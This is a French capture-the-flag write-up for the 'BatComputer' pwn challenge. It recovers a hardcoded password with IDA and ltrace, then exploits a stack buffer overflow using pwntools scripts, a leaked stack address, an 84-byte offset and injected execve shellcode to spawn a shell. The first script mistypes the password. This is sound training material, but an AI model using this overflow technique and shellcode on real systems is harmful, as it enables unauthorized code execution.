# BatComputer [Pwn] Challenge

`— Le binaire —`

Quand nous lançons le programme qui est un ELF 64 bit nous pouvons voir 2 choix .

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled.png)

En entrant 1 nous allons recevoir ce message et allons recommencer le programme. On vois directement que `0x7fffaaeb5de4` est une adresse mémoire.  

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%201.png)

En entrant 2 nous allons recevoir un input nous demandant de rentrer un mot de passe.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%202.png)

Le mot de passe est mauvais le programme va s’arrêter.

`— IDA —`

Démarrons IDA pour observer ce programme en détaille. Nous allons directement dans IDA-View-A de la fonction main.

On vois l’arbre de la logique du programme et à l’input du mot de passe nous avons un commentaire `; "b4tp@$$w0rd!”`

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%203.png)

Ici le programme va charger une variable contenant le résultat demandé et comparé avec la fonction _strcmp avec notre mot de passe si ils sont égaux si oui nous allons passé à la suite du programme.

Grâce au mot de passe trouvé dans IDA nous avons la possibilité de continuer le 2ème chemin.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%204.png)

Nous avons un deuxième input ou nous pouvons entrer un commande. 

`Deuxième possibilité :` Nous pouvons trouver ce mot de passe de plusieurs façons ici la plus courte avec ltrace qui va nous montrer toutes les fonction utilisé de nos programme. Le seul problème en utilisant ltrace c’est que entrons dans l’analyse dynamique qui n’est pas à faire sur un exécutable inconnu. 

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%205.png)

Nous voyons que en rentrant notre mot de passe nous avons eu une comparaison comme dans le code assembleur qui va vérifié si notre entré est `b4tp@$$w0rd!`.

`— Exploitation —`

En analysant avec ghidra le fichier et en trouvant la bonne fonction `FUN_001011ec` le read après avoir lu notre dernière input pour la commande de navigation va lire auStack84 qui ne peux contenir que 76 entrer

Si nous mettons par exemple 80 A dans la variable il nous faut un return dans ghidra le seul moyen d’avoir un return et de revenir au début et dans le choix 1 ou 2 mettre une valeurs incorrecte essayons.

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%206.png)

Nous avons bien réussi a faire un crash à notre programme nous devrons donc passer par ce moyen pour exploiter ce programme.

```python
#!/usr/bin/env python3

from pwn import *

def main():
    io = process('./batcomputer')

    #STEP 0
    # Enuméré les binaires
    password = "b4tp@$$word!"

    #STEP 1
    #Avoir l'adresse du stack
    io.sendlineafter('>', '1')
    stack_address = io.recvline().strip().split()[-1]
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)])
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address)
    print(stack_address)
    log.success(f"Leaked stack address: {p64(stack_address)}")

    #STEP2 
    #Buffer Overflow
    io.sendlineafter('>', '2')
    io.sendlineafter("password: ", password)
    payload = "a" * 137
    io.sendlineafter("commands: ", payload)

    #STEP3
    io.sendlineafter('>', '3')
    io.interactive()
if __name__ == '__main__':
    main()
```

Nous devons maintenant exploiter le buffer nous allons d’abord déterminer la limite de l’entrée.

```bash
┌──(root💀kali)-[/home/kali]
└─# python3                                                                          
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
```

On exécute le programme avec gdb et nous mettons le payload générer avec cyclic dans command puis nous exécutons le return en mettant 3.

Dans gdb nous voyons les retour et dans RSP nous avons (’vaaawaaa’)

![Untitled](BatComputer%20%5BPwn%5D%20Challenge%2031317262ee444cfc8e4662891aff547f/Untitled%207.png)

```bash
┌──(root💀kali)-[/home/kali]
└─# python3                                                                          
Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
>>> cyclic_find('vaaa')
84
```

```python
#!/usr/bin/python3

from pwn import *

def main():
    context.log_level='DEBUG'
    context.update(arch='amd64', os='linux')
    log.info("lets solve")
    p=process('./batcomputer')

    # leak address of my buffer
    p.recvuntil('>')
    p.sendline('1')

    leak_address = p.recvline().split()[-1]
    leak_address = int(leak_address,16)
    log.success(f'leak_address: {hex(leak_address)}')

    # send evil payload
    # payload + eip + shellcode

    padding = b'A' * 84

    shellcode  = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
    shellcode += b"\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
    shellcode += b"\x54\x5f\x99\x52\x57\x54\x5e\xb0"
    shellcode += b"\x3b\x0f\x05"

    buffer = flat (
            padding,
            p64(leak_address + 84+8),
            shellcode
            )

    p.recvuntil('>')
    p.send('2')
    p.recv()
    p.sendline('b4tp@$$w0rd!')
    p.recvline()
    p.send(buffer)

    # trigger buffer overflow
    p.recvline()
    p.sendline('3')

    p.interactive()

if __name__ == '__main__':
    main()
```